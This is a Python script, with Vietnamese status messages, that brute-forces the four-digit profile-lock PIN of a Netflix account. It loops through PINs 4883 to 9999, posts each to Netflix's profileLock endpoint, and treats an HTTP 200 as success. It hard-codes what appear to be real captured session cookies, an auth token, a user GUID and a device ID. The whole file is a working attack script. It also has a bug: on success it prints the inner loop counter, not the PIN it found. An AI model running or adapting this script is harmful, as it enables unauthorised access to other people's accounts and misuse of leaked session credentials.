import requests
from time import sleep
cookies = {
    'netflix-sans-normal-3-loaded': 'true',
    'netflix-sans-bold-3-loaded': 'true',
    'flwssn': '47786a92-4240-4600-a183-139fb8b558fa',
    'gsid': '47da1cfc-57af-4240-9a1c-1e2adc7f861c',
    'nfvdid': 'BQFmAAEBEHfbjC6SzMtpGDzNubnWfpVg8DvNzXOUFVKysiVJzTHWbY-YJxulbc3xObfNGDfUQlMrswI5rqyM6f8VdogProOYqTdG7TGHLjuSGWcKpByxIJi-FaVetA7G-D0Lx9GwKejWuvqOwNChqlI0_dgHEQ57',
    'SecureNetflixId': 'v%3D3%26mac%3DAQEAEQABABQw_seE67QXB_oPSvHxHS87JkODbNvPLR0.%26dt%3D1773301124914',
    'NetflixId': 'v%3D3%26ct%3DBgjHlOvcAxKJA8JafxTcUUXmabvHtDIHAdGXullPmY00BVtakY6qwlgmYpuIuPLNa2OcrEhZVlz4QeDuqckwisasdb2fci2uSdqyd5yJWyjubH_IeiZW9PP7ltv3xbAET_1L2huiLjo7y3RgmGs-oxr48ED8q0BCp3s8T8Jvi78NjDB0qG0s6HB7kBuqsSP3PHw82NQvOYBzE2M9R1eKGomLg1mFohEcRQNNX0ZcY7g1KOrhEy-vkj_b7wETjgL8E3KNSruN5PCFnA85VeD8SRIFzxfe7aWQVhsBcVY1DzS_Ppzl6bQSAjVbx66YLdqfnuNDb4nlwaNlhwFmkovfCD7J251g5c-cZ2iomlcz08zv5qLTnLit5SC9M08yjltv6ID-HIi4Y16ECfXIntmUErSmUmBLdEdHTQbiUwtrP179eabNHEMydR3FPA4skiPuh5bfAoAfRLqJbOCmwbUd_M4u16bMseiFL_X7gkxStcxNdW0pHvj6CbEJeA6onYakoBufgMEInkd36pHA5G3lHYWeLhgGIg4KDHicXlEiIx6p-CyoCg..%26pg%3DVKV2YMB5SVBJ7NGNQQNHGDPJIY%26ch%3DAQEAEAABABS6ZeySa0E9iJEaS-PYE10R8gFwF1jQS98.',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Thu+Mar+12+2026+14%3A48%3A05+GMT%2B0700+(Indochina+Time)&version=202601.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4f7b893b-f3ac-469f-ac80-f37adc9b9ed3&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false&crTime=1771849987714',
}

headers = {
    'accept': 'application/json, text/javascript, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,az;q=0.4',
    'content-type': 'application/json',
    'origin': 'https://www.netflix.com',
    'priority': 'u=1, i',
    'referer': 'https://www.netflix.com/browse',
    'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"19.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'x-netflix.browsername': 'Chrome',
    'x-netflix.browserversion': '146',
    'x-netflix.client.request.name': 'ui/xhrUnclassified',
    'x-netflix.clienttype': 'akira',
    'x-netflix.esn': 'NFCDCH-02-MTRK6X2L3F8PY1646N3FU7FHX79NP6',
    'x-netflix.esnprefix': 'NFCDCH-02-',
    'x-netflix.nq.stack': 'prod',
    'x-netflix.osfullname': 'Windows 10',
    'x-netflix.osname': 'Windows',
    'x-netflix.osversion': '10.0',
    'x-netflix.request.attempt': '1',
    'x-netflix.request.client.context': '{"appstate":"foreground"}',
    'x-netflix.request.client.user.guid': 'VKV2YMB5SVBJ7NGNQQNHGDPJIY',
    'x-netflix.request.id': '60eda919375e449496729869e01f4b25',
    'x-netflix.uiversion': 'v5f199d90',
    # 'cookie': 'netflix-sans-normal-3-loaded=true; netflix-sans-bold-3-loaded=true; flwssn=47786a92-4240-4600-a183-139fb8b558fa; gsid=47da1cfc-57af-4240-9a1c-1e2adc7f861c; nfvdid=BQFmAAEBEHfbjC6SzMtpGDzNubnWfpVg8DvNzXOUFVKysiVJzTHWbY-YJxulbc3xObfNGDfUQlMrswI5rqyM6f8VdogProOYqTdG7TGHLjuSGWcKpByxIJi-FaVetA7G-D0Lx9GwKejWuvqOwNChqlI0_dgHEQ57; SecureNetflixId=v%3D3%26mac%3DAQEAEQABABQw_seE67QXB_oPSvHxHS87JkODbNvPLR0.%26dt%3D1773301124914; NetflixId=v%3D3%26ct%3DBgjHlOvcAxKJA8JafxTcUUXmabvHtDIHAdGXullPmY00BVtakY6qwlgmYpuIuPLNa2OcrEhZVlz4QeDuqckwisasdb2fci2uSdqyd5yJWyjubH_IeiZW9PP7ltv3xbAET_1L2huiLjo7y3RgmGs-oxr48ED8q0BCp3s8T8Jvi78NjDB0qG0s6HB7kBuqsSP3PHw82NQvOYBzE2M9R1eKGomLg1mFohEcRQNNX0ZcY7g1KOrhEy-vkj_b7wETjgL8E3KNSruN5PCFnA85VeD8SRIFzxfe7aWQVhsBcVY1DzS_Ppzl6bQSAjVbx66YLdqfnuNDb4nlwaNlhwFmkovfCD7J251g5c-cZ2iomlcz08zv5qLTnLit5SC9M08yjltv6ID-HIi4Y16ECfXIntmUErSmUmBLdEdHTQbiUwtrP179eabNHEMydR3FPA4skiPuh5bfAoAfRLqJbOCmwbUd_M4u16bMseiFL_X7gkxStcxNdW0pHvj6CbEJeA6onYakoBufgMEInkd36pHA5G3lHYWeLhgGIg4KDHicXlEiIx6p-CyoCg..%26pg%3DVKV2YMB5SVBJ7NGNQQNHGDPJIY%26ch%3DAQEAEAABABS6ZeySa0E9iJEaS-PYE10R8gFwF1jQS98.; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Mar+12+2026+14%3A48%3A05+GMT%2B0700+(Indochina+Time)&version=202601.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4f7b893b-f3ac-469f-ac80-f37adc9b9ed3&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false&crTime=1771849987714',
}
for i in range(4883, 10000):
    s = str(i)
    if(i < 10):
        s = "000" + s;
    elif i < 100:
        s = "00" + s;
    elif i < 1000:
        s = "0" + s;
    json_data = {
        'action': "verify",
        'authURL': "c1.1773301681443.AgiMlOvcAxIg179nvW4M9TVw+RDKe2olNhls3rvejufGkCiDbIpSZvsYAg==",
        'guid': "VKV2YMB5SVBJ7NGNQQNHGDPJIY",
        'pin': s
    }
    for i in range(0,11,1):
        if i == 10:
            print(f"Đang check mã pin : {s} (1.0)\r", end = "")
        else :
            print(f"Đang check mã pin : {s} (0.{i})\r", end = "")
        sleep(0.1)
    response = requests.post(
        'https://www.netflix.com/nq/website/memberapi/release/profileLock',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    check = response.status_code
    
    print("                                \r", end = "")
    if(check == 200):
        print(f"\033[32mMã pin là : {i}\033[32m")
        break;
    else:
        print(f"\033[31mPin {s} sai:))\033[0m")

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.

#response = requests.post(
#    'https://www.netflix.com/nq/website/memberapi/release/profileLock',
#    cookies=cookies,
#    headers=headers,
#    data=data,

#)
